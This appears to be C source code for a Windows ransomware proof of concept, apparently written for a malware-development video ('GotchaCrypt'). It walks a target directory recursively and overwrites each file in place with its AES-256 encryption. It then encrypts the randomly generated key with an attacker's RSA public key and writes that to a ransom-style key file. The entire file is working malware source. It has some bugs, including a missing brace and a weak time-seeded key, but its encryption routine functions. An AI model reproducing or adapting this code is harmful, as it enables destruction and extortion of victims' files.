#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include "dirent.h"
#include <time.h>
#include <stdint.h>
#define _CRTDBG_MAP_ALLOC
#include <crtdbg.h>
#pragma comment(lib,"Crypt32.lib")

#define PATH_SEPARATOR '\\'
#define BUFFER_SIZE 1024


void displayErrorMessage(DWORD errorCode) {
    LPSTR messageBuffer = NULL;
    FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        errorCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPSTR)&messageBuffer,
        0,
        NULL);

    if (messageBuffer != NULL) {
        printf("Error: %s\n", messageBuffer);
        LocalFree(messageBuffer);
    }
    else {
        printf("Error: Unable to get error message for code %d\n", errorCode);
    }
}

char* generateKey() {

    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    const size_t stringLen = 256;
    char* randomString = (char*)malloc((stringLen + 1) * sizeof(char));

    if (randomString != NULL) {
        srand((unsigned int)time(NULL));
        for (int i = 0; i < stringLen; ++i) {
            randomString[i] = charset[rand() % (sizeof(charset) - 1)];
        }
        randomString[stringLen] = '\0';
    }

    return randomString;
} 

void encryptFile(const char* filePath, const char* key) {

     HANDLE hFile = CreateFileA(filePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Error opening file");
        displayErrorMessage(GetLastError());
        return;
    }


    HCRYPTPROV hCryptProv;
    if (!CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Error acquiring crypto context\n");
        CloseHandle(hFile);
        return;
    }

    HCRYPTHASH hHash;
    if (!CryptCreateHash(hCryptProv, CALG_SHA_256, 0, 0, &hHash)) {
        printf("Error creating hash\n");
        CryptReleaseContext(hCryptProv, 0);
        CloseHandle(hFile);
        return;
    }

    if (!CryptHashData(hHash, (const BYTE*)key, strlen(key), 0)) {
        printf("Error hashing data\n");
        CryptDestroyHash(hHash);
        CryptReleaseContext(hCryptProv, 0);
        CloseHandle(hFile);
        return;
    }

    HCRYPTKEY hKey;
    if (!CryptDeriveKey(hCryptProv, CALG_AES_256, hHash, 0, &hKey)) {
        printf("Error deriving key\n");
        CryptDestroyHash(hHash);
        CryptReleaseContext(hCryptProv, 0);
        CloseHandle(hFile);
        return;
    }

    DWORD dwFileSize = GetFileSize(hFile, NULL);
    DWORD dwBytesCt = dwFileSize;
    CryptEncrypt(hKey, NULL, TRUE, 0, NULL, &dwBytesCt, dwFileSize);


    BYTE* pBuffer = (BYTE*)malloc(dwBytesCt);
    DWORD dwBytesRead = 0;
    if (!ReadFile(hFile, pBuffer, dwFileSize, &dwBytesRead, NULL)) {
        printf("Error reading file\n");
        free(pBuffer);
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hCryptProv, 0);
        CloseHandle(hFile);
        return;
    }
    printf("[+] Succesfully saved plaintext file to a buffer: %s\n", pBuffer);




    if (!CryptEncrypt(hKey, NULL, TRUE, 0, pBuffer, &dwBytesRead, dwBytesCt)) {
        printf("Error encrypting data %d\n", GetLastError());
        free(pBuffer);
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hCryptProv, 0);
        CloseHandle(hFile);
        return;
    }
    printf("[+] Succesfully encrypted the buffer: %s\n", pBuffer);


    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    DWORD dwBytesWritten = 0;
    if (!WriteFile(hFile, pBuffer, dwBytesRead, &dwBytesWritten, NULL)) {
        printf("Error writing encrypted data to file\n");
    }
    else {
        printf("File encrypted successfully\n");
    }




    free(pBuffer);
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hCryptProv, 0);
    CloseHandle(hFile);
}

void encryptDirectory(const char* dirPath, const char* key) {
    DIR* dir;
    struct dirent* entry;

    if (!(dir = opendir(dirPath))) {
        printf("Error opening directory\n");
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
                continue;
            }

            char path[BUFFER_SIZE];
            snprintf(path, sizeof(path), "%s%c%s", dirPath, PATH_SEPARATOR, entry->d_name);
            encryptDirectory(path,key);
        }
        else {
            char filePath[BUFFER_SIZE];
            snprintf(filePath, sizeof(filePath), "%s%c%s", dirPath, PATH_SEPARATOR, entry->d_name);
            encryptFile(filePath,key);
        }
    }
    closedir(dir);
}

void encryptAES(const char* key, unsigned long* keyLen, const char* AESDONTDELEATE, const char* SPubKey) {
    //function that take exported private key and encrypts it with a server public key that was read from file.
    
    HANDLE hPublicKeyFile = CreateFileA(SPubKey, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hPublicKeyFile == INVALID_HANDLE_VALUE) {
        printf("[-] Error opening file");
        displayErrorMessage(GetLastError());
        return;
    }
    DWORD publicKeyLength = GetFileSize(hPublicKeyFile, NULL);
    BYTE* publicKeyData = (BYTE*)malloc(publicKeyLength);
    if(publicKeyData == NULL){
        printf("[-] Error while allocating memory for publicKeyData");
        displayErrorMessage(GetLastError());
        return;
    }
    DWORD dwBytesRead = 0;
    if(!ReadFile(hPublicKeyFile, publicKeyData, publicKeyLength, &dwBytesRead, NULL))

    printf("[?] Public key:\n");
    for (DWORD i = 0; i < publicKeyLength; ++i) {
        printf("%c", publicKeyData[i]);
    }
    printf("\n");

    //Calculate size of the converted Server Public Key
    DWORD PublicKeyBufferSize = 0;
    CryptStringToBinaryA(publicKeyData, publicKeyLength, CRYPT_STRING_BASE64HEADER, NULL, &PublicKeyBufferSize, NULL, NULL);

    //Convert and save Server Public Key to the buffer
    BYTE* PublicKeyBuffer = (BYTE*)malloc(PublicKeyBufferSize);
    if (!CryptStringToBinaryA(publicKeyData, publicKeyLength, CRYPT_STRING_BASE64HEADER, PublicKeyBuffer, &PublicKeyBufferSize, NULL, NULL)) {
        displayErrorMessage(GetLastError());
        printf("CryptStringToBinary failed: %lx\n", GetLastError());
    }

    DWORD publicKeyInfoLen = 0;
    if (!CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, PublicKeyBuffer, PublicKeyBufferSize, CRYPT_DECODE_ALLOC_FLAG, NULL, NULL, &publicKeyInfoLen)) { // a heap has been corrupted (but only sometimes huh)
        printf("Decode the binary key blob into a CERT_PUBLIC_KEY_INFO failed: %lx\n", GetLastError());
        displayErrorMessage(GetLastError());
        
    }

    CERT_PUBLIC_KEY_INFO* publicKeyInfo = (CERT_PUBLIC_KEY_INFO*)malloc(publicKeyInfoLen);
    //decode the binary key blob into a CERT_PUBLIC_KEY_INFO
    if (!CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, PublicKeyBuffer, PublicKeyBufferSize, CRYPT_DECODE_ALLOC_FLAG, NULL, &publicKeyInfo, &publicKeyInfoLen)) { // a heap has been corrupted (but only sometimes huh)
        printf("Decode the binary key blob into a CERT_PUBLIC_KEY_INFO failed: %lx\n", GetLastError());
        displayErrorMessage(GetLastError());
    }

    HCRYPTPROV hServerPublicKeyCryptProv;
    if (!CryptAcquireContext(&hServerPublicKeyCryptProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Error acquiring crypto context: %d\n", GetLastError());
        return FALSE;
    }

    // Import public key
    HCRYPTKEY hPublicKey;
    if (!CryptImportPublicKeyInfo(hServerPublicKeyCryptProv, X509_ASN_ENCODING, publicKeyInfo, &hPublicKey)) {
        displayErrorMessage(GetLastError());
        printf("CryptImportPublicKeyInfo failed: %lx\n", GetLastError());
    }

    printf("[+] Succesfully imported public key\n");

    DWORD dwFileSize = keyLen;
    DWORD dwBytesCt = dwFileSize;
    CryptEncrypt(hPublicKey, NULL, TRUE, 0, NULL, &dwBytesCt, dwFileSize);

    if (!CryptEncrypt(hPublicKey, NULL, TRUE, 0, key, &dwFileSize, dwBytesCt)) { 
        printf("Error encrypting data %d\n", GetLastError());
        CryptDestroyKey(key);
        CryptReleaseContext(hServerPublicKeyCryptProv, 0);
        return;
    }
    printf("[+] Succesfully encrypted the AES key\n");

    //this writes AES key to file
    HANDLE hFile = CreateFileA(AESDONTDELEATE, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Error opening file %d\n", GetLastError());
    }
    DWORD dwBytesWrittenAes = 0;
    if (!WriteFile(hFile, key, dwFileSize, &dwBytesWrittenAes, NULL)) {
        printf("Error writing to file %d\n", GetLastError());
    }
    printf("[+] Encrypted AES key written to file\n");
}


int main() {
    const char* path = "C:/Users/mjank/Desktop/DANGER";
    const char* SPubKey = "C:/Users/mjank/Documents/MalDev/RansomwareVideo/GotchaCrypt/keys/public.txt";
    const char* AESDONTDELEATE = "C:/Users/mjank/Desktop/AESDONTDELEATE.txt";
    const char* key = generateKey();
    unsigned int keySize = 256;

    encryptDirectory(path, key);

    encryptAES(key, keySize, AESDONTDELEATE, SPubKey);
    free(key);

    return 0;
}







